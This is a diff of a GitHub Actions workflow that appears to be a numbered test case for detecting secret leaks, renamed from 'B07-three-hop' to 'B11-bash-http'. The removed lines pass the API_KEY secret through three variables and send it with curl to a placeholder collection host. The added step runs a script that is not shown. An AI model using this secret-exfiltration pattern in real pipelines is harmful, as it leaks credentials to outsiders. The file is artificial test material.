@@ -1,4 +1,4 @@
-name: B07-three-hop
+name: B11-bash-http
 on: workflow_dispatch
 jobs:
   test:
@@ -6,8 +6,4 @@ jobs:
     env:
       API_KEY: ${{ secrets.API_KEY }}
     steps:
-      - run: |
-          first="$API_KEY"
-          second="$first"
-          third="$second"
-          curl --data "$third" https://example.invalid/collect
+      - run: bash scripts/s03_01.sh
